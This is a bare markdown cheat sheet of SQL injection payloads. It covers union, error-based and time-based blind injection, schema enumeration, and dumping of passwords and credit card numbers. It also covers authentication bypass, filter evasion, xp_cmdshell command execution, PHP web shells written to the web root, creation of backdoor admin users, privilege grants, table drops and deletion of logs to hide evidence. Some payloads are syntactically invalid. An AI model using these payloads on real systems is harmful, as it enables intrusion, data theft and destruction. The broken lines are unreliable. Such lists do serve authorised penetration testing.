
# SQL Injection Payloads

## Union-based SQL Injection
' UNION SELECT null, null, null; --
' UNION SELECT username, password, email FROM users; --

## Error-based SQL Injection
' AND 1=CONVERT(int, (SELECT @@version)); --
' AND 1=CAST((SELECT COUNT(*) FROM users) AS int); --

## Time-based Blind SQL Injection
' OR 1=1; WAITFOR DELAY '0:0:5'; --
' AND IF(1=1, SLEEP(5), 0); --

# Database Enumeration

## Extracting Database Names
' UNION SELECT schema_name FROM information_schema.schemata; --

## Extracting Table Names
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database(); --

## Extracting Column Names
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'; --

## Retrieving Database Version
' UNION SELECT @@version; --

## Retrieving Current Database User
' UNION SELECT user(); --

# Data Extraction

## Extracting Sensitive Data
' UNION SELECT username, password FROM users; --
' UNION SELECT card_number, card_expiry FROM credit_cards; --

## Bypassing Filters
' UNION SELECT NULL FROM users WHERE username LIKE '%admin%'; --
' UNION SELECT NULL FROM users WHERE email='admin@example.com'; --

## Conditional Data Extraction
' UNION SELECT username, password FROM users WHERE username='admin'; --

# Privilege Escalation

## Escalating Privileges
' UNION SELECT null, is_admin FROM users WHERE username='admin'; --
' UNION UPDATE users SET is_admin=1 WHERE username='admin'; --

# Post-Exploitation

## Injecting a Web Shell
' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'; --

## Executing Commands via SQL Injection
' UNION SELECT exec xp_cmdshell('whoami'); --
' UNION SELECT exec xp_cmdshell('ipconfig'); --

## Stacked Queries (if supported)
' ; DROP TABLE users; --
' ; UPDATE users SET password='newpassword' WHERE username='admin'; --

## Conditional Error-Based Injection
' AND 1=IF((SELECT LENGTH(password) FROM users WHERE username='admin') > 8, 1, (SELECT 1 UNION SELECT 2)); --
' AND 1=IF((SELECT ASCII(SUBSTRING(password, 1, 1)) FROM users WHERE username='admin') > 100, 1, 0); --

## Extracting Data with Subqueries
' UNION SELECT (SELECT CONCAT(username, ':', password) FROM users LIMIT 1 OFFSET 0); --
' UNION SELECT (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()); --

## Time-based Blind Injection with Functions
' OR IF(1=1, SLEEP(5), 0); --
' OR IF((SELECT LENGTH(password) FROM users WHERE username='admin') > 8, SLEEP(5), 0); --

# Database Fingerprinting

## Identifying Database Type (MySQL)
' AND (SELECT 1 FROM DUAL WHERE DATABASE() LIKE 'mysql%'); --

## Identifying Database Type (MSSQL)
' AND (SELECT 1 WHERE DB_NAME() = 'master'); --

## Identifying Database Type (PostgreSQL)
' AND (SELECT 1 WHERE current_database() = 'postgres'); --

# Bypassing Authentication

## Simple Bypass
' OR '1'='1'; --
' OR '1'='1'-- -
' OR 1=1; --

## Bypass with Comments
admin'-- 
' OR 'a'='a'/* 

# Data Exfiltration

## Exfiltrating Multiple Columns
' UNION SELECT username, password, email FROM users; --
' UNION ALL SELECT username, password FROM admin_users; --

## Dumping Data in Multiple Requests
' UNION SELECT NULL,NULL,NULL; -- Paginate to next page for more data
' UNION SELECT username FROM users LIMIT 1 OFFSET 0; --
' UNION SELECT username FROM users LIMIT 1 OFFSET 1; --

# Defensive Evasion

## Hex Encoding
' UNION SELECT 0x61646D696E, 0x70617373776F7264; --
' UNION SELECT UNHEX(HEX(username)), UNHEX(HEX(password)) FROM users; --

## Case Variation
' UnIoN SeLeCt username, password FROM users; --
' uNiOn sElEcT username, password, credit_card FROM users; --

# Command Execution (OS Command Injection via SQL)

## Executing Shell Commands
' UNION SELECT exec xp_cmdshell('whoami'); --
' UNION SELECT exec xp_cmdshell('net user admin'); --

## Writing Files via SQL Injection
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/cmd.php'; --
' UNION SELECT '<?php echo shell_exec($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'; --

# Post-Exploitation Persistence

## Creating a New Admin User
' ; INSERT INTO users (username, password, is_admin) VALUES ('hacker', 'password', 1); --
' ; UPDATE users SET is_admin=1 WHERE username='hacker'; --

## Modifying Existing Users
' ; UPDATE users SET password='newpassword' WHERE username='admin'; --
' ; DELETE FROM users WHERE username='guest'; --


# SQL Injection Techniques with Advanced Functions

## Extracting Multiple Fields with Concatenation
' UNION SELECT CONCAT(username, ':', password) FROM users; --
' UNION SELECT GROUP_CONCAT(username, ':', password) FROM users; --

## Conditional Errors and Data Extraction
' AND (SELECT CASE WHEN (LENGTH(password) > 8) THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='admin'); --
' AND (SELECT CASE WHEN (username='admin') THEN TO_CHAR(1/0) ELSE NULL END FROM dual); --

## Extracting Hashes and Encoding
' UNION SELECT username, MD5(password) FROM users; --
' UNION SELECT username, SHA1(password) FROM users; --
' UNION SELECT username, BASE64_ENCODE(password) FROM users; --

## Using Substrings for Blind SQL Injection
' UNION SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='admin'; --
' AND ASCII(SUBSTRING(password, 1, 1)) > 100; --

# Database Management and Manipulation

## Dropping and Renaming Tables
' ; DROP TABLE users; --
' ; RENAME TABLE users TO old_users; --

## Creating and Modifying Tables
' ; CREATE TABLE new_table (id INT, data VARCHAR(100)); --
' ; ALTER TABLE users ADD COLUMN secret_question VARCHAR(255); --

## Inserting and Updating Data
' ; INSERT INTO users (username, password) VALUES ('newuser', 'newpassword'); --
' ; UPDATE users SET password='newpass' WHERE username='admin'; --

# Evading Detection with Advanced Techniques

## Obfuscating Queries with Comments and Case Variation
' /* Comment */ UnIoN /* Another Comment */ SeLeCt username, password FROM users; --
' UnIoN SELECT username, password FROM users -- random comment

## Time-based Blind SQL Injection with Conditional Execution
' AND IF(1=1, BENCHMARK(1000000, MD5(1)), NULL); --
' AND IF((SELECT LENGTH(password) FROM users WHERE username='admin') > 8, SLEEP(5), NULL); --

## Hex and Binary Encoding for Obfuscation
' UNION SELECT HEX(username), HEX(password) FROM users; --
' UNION SELECT BINARY username, BINARY password FROM users; --

# Command Execution with Outfile and Into Dumpfile

## Writing to Files via SQL Injection
' UNION SELECT '<?php echo shell_exec($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/cmd.php'; --
' UNION SELECT LOAD_FILE('/etc/passwd'); INTO DUMPFILE '/var/www/html/passwd.txt'; --

## Writing Payloads via SQL Injection
' UNION SELECT '<?php echo shell_exec($_GET["cmd"]); ?>' INTO DUMPFILE '/var/www/html/shell.php'; --
' UNION SELECT '<?php echo system($_GET["cmd"]); ?>' INTO DUMPFILE '/var/www/html/system.php'; --

# Advanced SQL Injection for Privilege Escalation

## Gaining Database Administrative Privileges
' ; GRANT ALL PRIVILEGES ON *.* TO 'admin'@'localhost'; --
' ; REVOKE ALL PRIVILEGES ON *.* FROM 'user'@'localhost'; --

## Triggering and Exploiting Triggers
' ; CREATE TRIGGER after_update BEFORE UPDATE ON users FOR EACH ROW SET NEW.password = 'hacked'; --
' ; DROP TRIGGER IF EXISTS after_update; --

# Post-Exploitation and Cleanup

## Removing Evidence
' ; DELETE FROM logs WHERE action='injection'; --
' ; DELETE FROM users WHERE username='testuser'; --

## Dropping Backdoors
' ; DROP TABLE IF EXISTS backdoor; --
' ; DELETE FROM users WHERE username='hacker'; --
